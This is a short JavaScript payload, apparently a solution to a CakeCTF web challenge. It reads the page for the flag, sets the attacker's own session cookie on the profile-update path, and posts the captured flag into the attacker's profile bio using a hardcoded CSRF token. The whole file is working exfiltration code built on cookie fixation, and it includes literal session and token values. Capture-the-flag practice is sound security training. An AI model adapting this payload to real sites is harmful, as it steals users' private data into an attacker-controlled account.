xhr = new XMLHttpRequest();

// Get flag
let flag;
xhr.open("GET", "/", false);
xhr.onload = function () {
    flag = /CakeCTF{.*}/.exec(xhr.response)[0];
};
xhr.send(null);

// Set our account cookie for /api/user/update
document.cookie = "session=eyJjc3JmX3Rva2VuIjoiMGIxMzYwMjc5YWFlYTAyOTU2OTNlNmE1MDE1Y2QyN2Q0Y2EwOWJiOCIsInVzZXIiOiIxMjM0NTY3OCJ9.Yxhk-Q.e1-HkpckpFGB07p-qbZvZ5tBW5k; path=/api/user/update"

// Set csrf_token to our csrf_token
let csrf = "IjBiMTM2MDI3OWFhZWEwMjk1NjkzZTZhNTAxNWNkMjdkNGNhMDliYjgi.Yxhqhg.fpyT9r_MmHtm_4ZL-iZzgShCDoc";

// Post flag to our profile
xhr.open("POST", "/api/user/update", false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
data = `bio=${flag}&csrf_token=${csrf}`;
console.log(data);
xhr.send(data);